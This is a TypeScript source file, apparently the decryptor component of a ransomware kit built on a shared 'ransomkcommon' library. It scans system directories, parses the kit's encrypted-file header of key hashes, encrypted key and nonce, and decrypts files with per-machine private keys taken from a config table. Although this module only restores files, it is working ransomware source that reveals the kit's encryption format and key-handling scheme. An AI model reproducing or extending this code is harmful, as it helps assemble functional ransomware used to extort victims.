import fs, { PathLike } from "node:fs";
import path from "node:path";

import {
  AsymmetricKeyPair,
  RansomDirMode,
  symmetric,
  asymmetric,
  MachineDecryptionKeys,
  appendLog,
  setRansomwareHash,
} from "ransomkcommon";
import { hash } from "ransomkcommon";

import {
  RANSOM_DIR_MODES,
  streamTargetFiles,
  SAFE_RANSOM_DIR_MODE,
} from "ransomkcommon";

async function* decryptFiles(
  targetFiles: AsyncGenerator<[PathLike, boolean]>,
  decryptionHashTable: Record<string, MachineDecryptionKeys>
): AsyncGenerator<PathLike> {
  for await (const [encryptedFilePath, isOurRansomFile] of targetFiles) {
    try {
      const cypherFileBuffer = fs.readFileSync(encryptedFilePath);

      const hashLen = hash(Buffer.from("dummy", "hex")).length;

      const fileRootPublicKeyHashHeader = cypherFileBuffer.subarray(0, hashLen);

      const fileMachineSpecificPublicKeyHashHeader = cypherFileBuffer.subarray(
        hashLen,
        hashLen + hashLen
      );

      const fileMachineSpecificPublicKeyHashHeaderHex =
        fileMachineSpecificPublicKeyHashHeader.toString("hex");

      const {
        machineSpecificPublicKey: machineSpecificPublicKeyBase64,
        machineSpecificPrivateKey: machineSpecificPrivateKeyBase64,
      } = decryptionHashTable[fileMachineSpecificPublicKeyHashHeaderHex];

      appendLog({
        hashLen,
        fileMachineSpecificPublicKeyHashHeaderHex,
        machineSpecificPublicKeyBase64,
      });

      if (typeof machineSpecificPublicKeyBase64 === "undefined") {
        appendLog({
          message: `Could not decrypt ${encryptedFilePath} because ${fileMachineSpecificPublicKeyHashHeaderHex} was not present in the [decryptionHashTable]`,
        });
        continue;
      }

      // const samePublicKeyHash =
      //   rootPublicKeyHash.toString("hex") ===
      //   fileRootPublicKeyHashHeader.toString("hex");

      const canWeDecryptIt =
        decryptionHashTable[
          fileMachineSpecificPublicKeyHashHeader.toString("hex")
        ] !== undefined;

      if (!canWeDecryptIt) {
        // We cannot decrypt it, ignore.
        appendLog("[Skipped] " + encryptedFilePath);
      } else {
        const kenLenOffset =
          hashLen + fileMachineSpecificPublicKeyHashHeader.length;

        const nonceLenOffset = kenLenOffset + 4;

        const keyLen = cypherFileBuffer.readUint32BE(kenLenOffset);
        const nonceLen = cypherFileBuffer.readUint32BE(nonceLenOffset);

        const encryptedKeyOffset = nonceLenOffset + 4;
        const encryptedNonceOffset = encryptedKeyOffset + keyLen;
        const encryptedFileBufferOffset = encryptedNonceOffset + nonceLen;

        const encryptedKey = cypherFileBuffer.subarray(
          encryptedKeyOffset,
          encryptedNonceOffset
        );

        const encryptedNonce = cypherFileBuffer.subarray(
          encryptedNonceOffset,
          encryptedFileBufferOffset
        );

        const encryptedFileBuffer = cypherFileBuffer.subarray(
          encryptedFileBufferOffset
        );

        const machineSpecificPrivateKey = Buffer.from(
          machineSpecificPrivateKeyBase64,
          "base64"
        );

        const key = await asymmetric.decrypt(
          encryptedKey,
          machineSpecificPrivateKey
        );

        const nonce = await asymmetric.decrypt(
          encryptedNonce,
          machineSpecificPrivateKey
        );

        const plainFileBuffer = await symmetric.decrypt(
          encryptedFileBuffer,
          key,
          nonce
        );

        key.fill(0);
        nonce.fill(0);

        fs.writeFileSync(encryptedFilePath, plainFileBuffer);

        // Same path, but it's now decrypted.
        const plainFilePath = encryptedFilePath;

        appendLog("[Decrypted] " + plainFilePath);

        yield plainFilePath;
      }
    } catch (e) {
      appendLog({
        error: e,
        message: `Decryption failed for ${encryptedFilePath}`,
      });
    }
  }
}

(async () => {
  try {
    const config = JSON.parse(
      fs.readFileSync(
        path.join(__dirname, "..", "ransomk.decrypt.config.json"),
        {
          encoding: "utf8",
        }
      )
    );

    const { decryptionHashTable, rootPublicKeyHash } = config;

    setRansomwareHash(rootPublicKeyHash);

    appendLog({
      decryptionHashTable,
      message: "Starting decryption...",
    });

    let i = 0;

    for await (const decryptedFilePath of decryptFiles(
      streamTargetFiles(RansomDirMode.streamSystemDir),
      decryptionHashTable
    )) {
      appendLog(`${++i} file(s) were decrypted. Last: ${decryptedFilePath}`);
    }
  } catch (e: any) {
    appendLog({ error: e, message: "Decryption failed" });
  }
})();
